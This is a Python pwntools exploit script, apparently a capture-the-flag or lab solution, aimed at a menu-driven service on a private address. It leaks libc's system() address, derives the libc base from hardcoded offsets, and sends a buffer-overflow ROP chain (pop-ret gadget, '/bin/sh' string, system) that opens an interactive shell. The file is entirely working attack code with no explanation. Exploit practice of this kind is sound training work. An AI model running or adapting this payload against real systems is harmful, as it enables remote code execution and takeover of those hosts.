#!/usr/bin/env python

from pwn import *
import struct

rhp = {'host': '192.168.33.12', 'port':1234}

popret_offset = 0x00021102
sys_offset = 0x45390
sh_offset = 0x18cd57

#============================================

def attack(conn):
    conn.recvuntil(': ')
    conn.sendline('1')
    conn.recvuntil(': ')
    res = conn.recvline()
    res = res.decode()
    libc_addr = int(res, 0)
    log.info(libc_addr)
    conn.recvuntil(': ')
    conn.sendline('2')
    conn.recvuntil(': ')
    conn.sendline('system')
    conn.recvuntil(': ')
    res = conn.recvline()
    res = res.decode()
    sys_addr = int(res, 0)
    libc_addr =  sys_addr - sys_offset
    log.info(hex(libc_addr))

    popret_addr = libc_addr + popret_offset
    sh_addr = libc_addr + sh_offset

    log.info("popret_addr")
    log.info(hex(popret_addr))
    log.info("sh_addr")
    log.info(hex(sh_addr))


    payload = b'A'*8
    payload += p64(popret_addr)
    payload += p64(sh_addr)
    payload += p64(sys_addr)

    log.info(payload)

    conn.recvuntil(': ')
    conn.sendline('3')
    conn.recvuntil(': ')
    conn.sendline(str(len(payload) + 1))
    conn.sendline(payload)
    res = conn.recvuntil(': ')
    log.info(res)
    conn.sendline('4')

    conn.interactive()
    # res = conn.recv()
    # log.info(res)
    #
    # conn.sendline(b'ls')
    # res = conn.recv()
    # log.info(res)

#============================================

if __name__=='__main__':
    conn = remote(rhp['host'], rhp['port'])
    attack(conn)


#============================================
